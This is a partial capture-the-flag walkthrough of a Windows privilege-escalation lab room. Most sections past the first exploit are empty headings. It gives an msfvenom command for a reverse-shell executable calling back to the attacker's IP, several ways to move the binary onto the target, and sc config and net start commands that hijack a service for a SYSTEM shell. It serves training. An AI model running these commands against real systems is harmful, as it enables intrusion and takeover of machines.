# Windows 10 Priv Esc room From TryHackMe

[1. Intro](#intro)

[2. Generating a Reverse Shell Executable](#generating-a-reverse-shell-executable)

[3. Service Exploits - Insecure Service Permissions](#service-exploits---insecure-service-permissions)

[4. Service Exploits - Unquoted Service Path](#service-exploits---unquoted-service-path)

[5. Service Exploits - Weak Registry Permissions](#service-exploits---weak-registry-permissions)

[6. Service Exploits - Insecure Service Executables](#service-exploits---insecure-service-executables)

[7. Registry - AutoRuns](#registry---autoruns)

[8. Registry - AlwaysInstallElevated](#registry---alwaysinstallelevated)

[9. Passwords - Registry](#passwords---registry)

[10. Passwords - saved creds](#passwords---saved-creds)

[11. Passwords - Security Account Manager (SAM)](#passwords---security-account-manager-sam)

[12. Passwords - Passing the Hash](#passwords---passing-the-hash)

[13. Scheduled Tasks](#scheduled-tasks)

[14. Insecure GUI Apps](#insecure-gui-apps)

[15. Startup Apps](#startup-apps)

[16. Token Impersonation - Rogue Potato](#token-impersonation---rogue-potato)

[17. Token Impersonation - PrintSpoofer](#token-impersonation---printspoofer)

[18. Privilege Escalation Scripts](#privilege-escalation-scripts)

## Intro

`xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP`

![image](https://user-images.githubusercontent.com/83407557/181599686-6ed867b0-25b4-47b1-8994-6fda5b5b3e36.png)
*image source https://tryhackme.com/room/windows10privesc*

## Generating a Reverse Shell Executable

The first step is going to be to create a reverse shell executable using msfvenom. Then I need to transfer this binary over to the target machine. The authors of this room have you transfer this file via SMB. However there are other ways of doing this, that I will also show here. They include, transfering the binary via FTP, netcat, exe2hex, and http. Depending on the firewalls certain ports may not be available, having multiple ways to transfer your files in your virtual tool belt is always a good thing.

### Creating reverse.exe

We need to know our ipv4 address on the tryhackme VPN before we can craft our revshell. Also in the example the author uses port 53 as the listening port. This is the port normally used by DNS, we may be using this for firewall reasons or because it is a good port to hide traffic, in any case I will be keeping it the same for my binary.

![image](https://user-images.githubusercontent.com/83407557/181602930-78389fa7-8de1-4d9c-bfb0-821e62fb4b48.png)*getting ipv4 address on THM vpn*

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 -f exe -o reverse.exe`

![image](https://user-images.githubusercontent.com/83407557/181603375-da05a314-7e5a-43ed-ac1b-ae194ac8bd25.png)*Creating binary with msfvenom*

### Transfering reverse.exe Via SMB (The authors way)

Using the smb server from the impacket tool kit, from kali linux the following command can spin up an SMB share in the current directory with the following command:

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`

Then from the windows 10 RDP session, in a cmd terminal the copy command can be used to get a file from our SMB kali share:

`copy\\<kali ip>\kali\<file> <writable path on Windows>`  

![image](https://user-images.githubusercontent.com/83407557/181866236-da7538f9-95c2-42a2-a948-8f914f7ef448.png)

To test that it worked, start a netcat listener on port 53 and test the binary.

![image](https://user-images.githubusercontent.com/83407557/181866273-128d0611-d2b5-415c-9851-7a7548a9ef6c.png)

### Transfering reverse.exe Via HTTP

Using python3 on kali and powershell on the target machine, here is how we would download the binary via HTTP

![image](https://user-images.githubusercontent.com/83407557/181866418-6ef48e31-5c6c-49dd-ab8a-5a8512a4f5b4.png)

Again, we want to test that the transfer worked, but trying to get another nc callback.

![image](https://user-images.githubusercontent.com/83407557/181866474-d5093db4-908c-4fe9-b412-5199ca136c88.png)

### Transfering via FTP

Using a program like pure-ftp on kali, you can spin up a ftp server like we were able to do with ftp.

![image](https://user-images.githubusercontent.com/83407557/181866593-d7fa5bd6-f9d1-4881-89bc-1ad7ddba2948.png)

### Transfering via Exe2hex

Sometimes you only have access to a dumb-shell with no interactivity. Making certain methods (like ones where we are prompted for a password) impossible. There is however a program called exe2hex, that will turn a windows binary into a seqence of echo commands that can use a the windows clipboard to build out the binary on a target system:

First use exe2hex on our rev shell, then use xclip to copy the entire file to our clipboard.

![image](https://user-images.githubusercontent.com/83407557/182493651-c667adaa-8d6f-438a-b7f6-dce2126a44b5.png)

Then pasting it into a cmd prompt on windows, will create the binary in our current directory

![image](https://user-images.githubusercontent.com/83407557/182493955-7a3d8acb-8d04-44b9-9371-356b85abeb78.png)


### Transfering additional binaries

If we are already transfering binaries with no attempt to hide them or encrypt our traffic, we might as well transfer post exploitation tools as well. These (for me at least) will include a memory dumping tool such as mimikatz, an enumeration and priv-esc scanning tool such as WinPEAs, and pivoting tools such as chisel.

The first tool I will ususally run on a system will be WinPeas or LinPeas, especially if I am not nt system/root. Each of the methods of priv esc can be discovered using winpeas.
![image](https://user-images.githubusercontent.com/83407557/183122432-57de879e-8829-4e89-a293-0cc6a10aca63.png)

It can help spot things like system misconfigurations, kernel vulns, and stored passwords.

![image](https://user-images.githubusercontent.com/83407557/183122696-ff484129-1608-4597-98e3-46142938ca4e.png)


## Service Exploits - Insecure Service Permissions
As can be seen from winpeas, there is a service with insecure permissions in that we can modify it

![image](https://user-images.githubusercontent.com/83407557/183123129-7c92dec0-262c-4bfa-a581-648f6214916c.png)

I can use accesschk.exe from systinternals to show this as well as showing that SERVICE_CHANGE_CONFIG means I can modify this service. And sc query <servicename> shows that SERVICE_START_NAME = system.

![image](https://user-images.githubusercontent.com/83407557/183123579-71b7c08a-ac86-4d24-b9f9-69dcf681e20d.png)

![image](https://user-images.githubusercontent.com/83407557/183124232-33523d44-4405-4671-98f4-575f0cb28c9f.png)


To exploit this i can use sc configure to set the binary path to that of my own reverse shell
  
`sc config daclsvc binpath= "\"C:\Users\user\Desktop\reverse.exe""`

![image](https://user-images.githubusercontent.com/83407557/183125029-401a99f1-7f38-4a45-b638-747eecb2bfed.png)

After starting a netcat listener on kali, I can use **net start** to start the exploited daclsvc service. I will then get a system-shell callback on my nc listener.
  
  `net start daclsvc`
  
![image](https://user-images.githubusercontent.com/83407557/183125386-010dfafd-1cf5-4539-8f22-4699bd3d5e6d.png)

## Service Exploits - Unquoted Service Path
## Service Exploits - Weak Registry Permissions
## Service Exploits - Insecure Service Executables
## Registry - AutoRuns
## Registry - AlwaysInstallElevated
## Passwords - Registry
## Passwords - saved creds
## Passwords - Security Account Manager (SAM)
## Passwords - Passing the Hash
## Scheduled Tasks
## Insecure GUI Apps
## Startup Apps
## Token Impersonation - Rogue Potato
## Token Impersonation - PrintSpoofer
## Privilege Escalation Scripts
